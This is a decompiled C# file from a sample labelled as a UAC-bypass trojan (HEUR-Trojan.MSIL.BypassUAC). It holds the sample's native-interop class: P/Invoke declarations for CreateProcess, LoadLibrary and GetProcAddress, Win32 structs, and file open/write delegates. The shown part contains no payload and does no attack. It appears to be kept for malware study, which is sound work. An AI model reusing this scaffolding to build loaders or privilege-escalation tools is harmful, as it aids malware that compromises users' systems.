// Decompiled with JetBrains decompiler
// Type: DiagnosticUtil.Native
// Assembly: DiagnosticUtil, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C6A47F43-C4B9-4F39-9210-79D201F89C2D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.BypassUAC.gen-c98dcfafc43b43be717e17ad04748998f457316af4062c15173c2ba2c71687aa.exe

using System;
using System.Runtime.InteropServices;

namespace DiagnosticUtil
{
  public class Native
  {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CreateProcess(
      string lpApplicationName,
      string lpCommandLine,
      IntPtr lpProcessAttributes,
      IntPtr lpThreadAttributes,
      bool bInheritHandles,
      uint dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      [In] ref Native.STARTUPINFO lpStartupInfo,
      out Native.PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    public struct SECURITY_ATTRIBUTES
    {
      public int nLength;
      public IntPtr lpSecurityDescriptor;
      public bool bInheritHandle;
    }

    public struct STARTUPINFO
    {
      private uint cb;
      private IntPtr lpReserved;
      private IntPtr lpDesktop;
      private IntPtr lpTitle;
      private uint dwX;
      private uint dwY;
      private uint dwXSize;
      private uint dwYSize;
      private uint dwXCountChars;
      private uint dwYCountChars;
      private uint dwFillAttributes;
      private uint dwFlags;
      private ushort wShowWindow;
      private ushort cbReserved;
      private IntPtr lpReserved2;
      private IntPtr hStdInput;
      private IntPtr hStdOutput;
      private IntPtr hStdErr;
    }

    public struct STARTUPINFOEX
    {
      private Native.STARTUPINFO StartupInfo;
      private IntPtr lpAttributeList;
    }

    public struct PROCESS_INFORMATION
    {
      private IntPtr hProcess;
      private IntPtr hThread;
      private int dwProcessId;
      private int dwThreadId;
    }

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool myCloseFnc(IntPtr hFile);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.SysInt)]
    public delegate IntPtr MyOpenFunc(
      [MarshalAs(UnmanagedType.LPWStr)] string filename,
      uint access,
      int share,
      IntPtr securityAttributes,
      int creationDisposition,
      int flagsAndAttributes,
      IntPtr templateFile);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool MyWriteFunc(
      IntPtr hFile,
      byte[] lpBuffer,
      uint nNumberOfBytesToWrite,
      out uint lpNumberOfBytesWritten,
      IntPtr lpOverlapped);
  }
}
